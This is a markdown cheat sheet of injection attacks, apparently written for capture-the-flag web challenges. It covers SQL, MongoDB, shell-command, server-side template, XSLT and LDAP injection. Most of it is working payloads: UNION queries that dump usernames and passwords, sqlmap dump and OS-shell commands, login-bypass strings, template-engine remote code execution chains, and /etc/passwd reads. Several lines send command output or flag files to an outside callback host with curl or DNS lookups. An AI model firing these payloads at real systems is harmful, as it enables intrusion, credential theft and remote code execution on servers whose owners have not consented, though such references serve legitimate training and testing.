# Injection — SQLi, NoSQL, command injection, SSTI, expression languages

Live targets are gated by the router (`ctf`). Fuzz local mirrors first.

## 1. SQL injection

### Triage (manual)

```bash
# payload markers: ' " ) \` and comment tails: -- - (MySQL/PG), # (MySQL), */ 
# classic ladder on one param:
id=1'          # DB error in response = error-based SQLi
id=1' AND 1=1-- -   # vs id=1' AND 1=2-- - : content diff = boolean-blind
id=1' AND SLEEP(5)-- -     # response delays = time-blind
```

| Response behavior | Class | Next |
|---|---|---|
| SQL error echoed (`SQL syntax`, `unterminated quoted string`) | error-based | read errors as oracle; UNION |
| `1=1` vs `1=2` changes content, no errors | boolean-blind | script char-by-char extraction |
| `SLEEP(5)` delays, no visible diff | time-blind | script with timing oracle |
| Nothing, ever | param maybe numeric/string-joined elsewhere | try second-order, other params |

Error strings also fingerprint the DBMS: `You have an error in your SQL syntax` = MySQL;
`unterminated quoted string`/`ERROR:` = PostgreSQL; `ORA-` = Oracle; `SQL Server`/
`Unclosed quotation mark` = MSSQL. Version one-liners for UNION columns:
`@@version` (MySQL/MSSQL), `version()` (PG), `sqlite_version()` (SQLite).

### UNION extraction (error-based or visible columns)

```sql
-- 1. column count: increase ORDER BY n until it errors
?search=a' ORDER BY 1-- -
?search=a' ORDER BY 5-- -      -- error between 4 and 5 means 4 columns

-- 2. UNION with NULLs (type-safe everywhere)
?search=a' UNION SELECT NULL,NULL,NULL,NULL-- -

-- 3. find render columns: swap in markers one at a time
?search=a' UNION SELECT 'xx1',NULL,'xx3',NULL-- -

-- 4. extract
?search=a' UNION SELECT NULL,group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
?search=a' UNION SELECT NULL,group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
?search=a' UNION SELECT NULL,group_concat(user,':',password),NULL,NULL FROM users-- -
```

Postgres: `table_schema='public'`; table names in `information_schema.tables` same shape.
Blind (no render column): fall back to boolean/time or sqlmap.

### Time-based payloads per DBMS

| DBMS | Sleep payload |
|---|---|
| MySQL | `AND SLEEP(5)` / `AND BENCHMARK(5000000,SHA1('x'))` |
| PostgreSQL | `;SELECT pg_sleep(5)--` (stacked; also `AND (SELECT 1 FROM pg_sleep(5)) IS NULL`) |
| MSSQL | `;WAITFOR DELAY '0:0:5'--` |
| SQLite | none; use `AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))` CPU burn |

### sqlmap

```bash
sudo pacman -S sqlmap
sqlmap -u "$base/item?id=1" --batch --dbs --threads 5
sqlmap -u "$base/item?id=1" --batch -D webdb --tables
sqlmap -u "$base/item?id=1" --batch -D webdb -T users --dump

# real target flows:
sqlmap -r request.txt --batch --dbs            # paste a Burp/curl request, mark inject point with *
sqlmap -r request.txt --batch --level 3 --risk 2          # params in headers/cookies
sqlmap -u "$base/item?id=1" --forms --batch               # auto-parse forms
sqlmap -u "$base/item?id=1" --batch --tamper=space2comment   # naive WAF/space filters
sqlmap -u "$base/item?id=1" --batch --technique=T          # time-blind only
sqlmap -u "$base/item?id=1" --batch --os-shell             # try file write/RCE (MySQL/PG)
sqlmap -u "$base/item?id=1" --batch --proxy http://127.0.0.1:8080   # route through mitmproxy/Burp
```

`--tamper` note: pick per-filter — `space2comment` (spaces), `between` (`>`→`NOT BETWEEN`),
`charencode` (URL encode), `randomcase` (keyword case). `--threads` >10 can break
time-blind detection (delays overlap); use `--threads 1` for `--technique=T`.

## 2. NoSQL injection (MongoDB)

Express + Mongo parses `user[$ne]=x` style params into query objects (qs semantics).

```bash
# auth bypass — $ne / $nin / $gt on both fields:
curl -s "$base/login" -d 'username[$ne]=x&password[$ne]=x'
curl -s "$base/login" -H 'Content-Type: application/json' \
     -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'

# blind char extraction — $regex:
curl -s "$base/login" -d 'username[$regex]=^a&password[$ne]=x'    # response diff = hit
curl -s "$base/login" -d 'username[$regex]=^admin&password[$regex]=^f'

# $where runs server-side JavaScript (timing oracle):
curl -s "$base/login" -H 'Content-Type: application/json' \
     -d '{"$where":"if (this.username == \"admin\") { sleep(5000); } return false;"}'

# $func-ish operators also worth trying: $gt, $nin, $exists, $mod
```

Script `$regex` extraction: iterate `^a`, `^b`, ... first char, then append — 26-ish
requests per character, response-diff or timing as oracle. Mongo operator injection
also applies to `find`, `findOne`, `update` (`$set` injection via `sort[$meta]` etc.)
and to URL params parsed by qs even outside login.

## 3. Command injection

| Context | Payloads |
|---|---|
| shell after user input | `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`, newline `%0aid` |
| ping/traceroute wrappers | `127.0.0.1; id`, `127.0.0.1 && id`, `127.0.0.1 | id` |
| filename into shell | `file$(id).txt`, `` file`id`.txt ``, `file;id;.txt` |
| partial filter (spaces blocked) | `{cat,/flag}`, `$IFS`, `cat</flag`, `id$IFS` |
| quotes around input | close quote: `'$(id)'`, `"'\";id\"'"` trial and error |

Blind confirmation — no output needed, three channels:

```bash
# time:
; sleep 10
# DNS/HTTP callback to yourself (interactsh: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest):
; nslookup $(id).<interactsh-domain>
; curl http://<interactsh-domain>/$(id -u)
# file write to later read via LFI/directory:
; cp /flag.txt /var/www/html/f.txt
```

Output channels when the command runs but stdout is hidden: write to a webroot,
mail it, `curl -d @/flag http://you/`, DNS char-by-char (`$(cut -c1 /flag).x.oast.sh`).

## 4. SSTI — server-side template injection

### Engine decision tree

Inject into any templated field (name, email, filename, search):

| Probe | Result | Engine |
|---|---|---|
| `${7*7}` | 49 | FreeMarker / Velocity / Mako / Thymeleaf-ish (JVM or Python) — keep probing |
| `{{7*7}}` | 49 | Jinja2 / Twig / Nunjucks / handlebars-like |
| `{{7*'7'}}` | `7777777` (string repeat) | **Jinja2 (Python)** or Nunjucks (JS) |
| `{{7*'7'}}` | `49` (numeric coercion) | **Twig (PHP)** |
| `<%= 7*7 %>` | 49 | ERB (Ruby) / JSP |
| `#{7*7}` | 49 | Ruby interpolation / SpEL (Spring) / JSF EL |
| `{{7*7}}` renders literally | not evaluated | no SSTI here (maybe client-side only) |
| `{{7*'7'}}` error + `freemarker` in trace | — | FreeMarker |

Jinja2 vs Nunjucks: try `{{constructor}}` (JS engines expose it, Python errors) or
`{{ range(3) }}` semantics. Version traces in errors settle it.

### Payloads per engine

```python
# Jinja2 — direct:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Jinja2 — dots/underscores filtered (attr + \x5f hex escapes):
{{ ''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')() }}
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f') }}
```

```php
// Twig >= 2: filter/map callbacks reach PHP functions:
{{['id']|filter('system')}}
{{['id']|map('system')}}          # map applies to each element
// Twig 1.x:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

```
<#-- FreeMarker -->
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```

```erb
<%= %x(id) %>          <%# ERB (Ruby) %>
<%= `id` %>
```

```js
// JS engines (Nunjucks, doT, EJS-in-Node): reach Function via a builtin's constructor
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")() }}
```

JVM expression languages (Spring/Struts/JSF) — same reflection one-liner works in
SpEL, OGNL, and EL contexts; use it when the short form is filtered:

```java
// SpEL (Spring): #{...}
#{T(java.lang.Runtime).getRuntime().exec('curl http://you/')}
// OGNL (Struts2): %{...} or ${...}
%{@java.lang.Runtime@getRuntime().exec('id')}
// engine-agnostic reflection chain (EL/OGNL/Log4j-style):
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"curl http://you/")}
```

Note `Runtime.exec(String)` splits on spaces badly on some JVMs; prefer
`exec(new String[]{"/bin/sh","-c","..."})` via SpEL, or simple no-arg commands
(`/usr/bin/curl$IFS...` style does not apply on JVM — use the array form).

### Automation + delivery paths

```bash
git clone https://github.com/epinna/tplmap && cd tplmap
scripts/ctf python tplmap.py -u "$base/?name=*"    # engine detect + try all
scripts/ctf python tplmap.py -u "$base/?name=*" --os-shell
```

SSTI often arrives where you least expect: PDF/invoice generators, email templates,
"hello {user}" renderers, uploaded template files, error pages echoing input, and
markdown renderers. Any `render_template_string(user_input)` / `Twig::render(user)`
/ `Velocity.evaluate` sink in source = instant RCE.

## 5. XSLT injection

When the app transforms XML with user XSLT (file upload → transform preview):

```xml
<xsl:value-of select="unparsed-text('/etc/passwd')"/>          <!-- XSLT 2.0 (Saxon) -->
<xsl:value-of select="document('/etc/passwd')"/>               <!-- XXE-ish read -->
<xsl:value-of select="php:function('system','id')"/>           <!-- PHP XSLTProcessor,
                                                                     needs registerPHPFunctions() -->
```

## 6. LDAP injection

Login filters like `(&(uid=INPUT)(userPassword=PASS))`:

```text
INPUT = *                     # matches everything → auth bypass with any password
INPUT = admin*                # prefix match
INPUT = admin)(objectClass=*  # closes the clause: (&(uid=admin)(objectClass=*)(userPassword=...))
INPUT = *)(uid=*))(|(uid=*    # always-true tail
```

Test locally with `ldapsearch` (in `sudo pacman -S openldap`) against the same
filter shape before firing at the target.
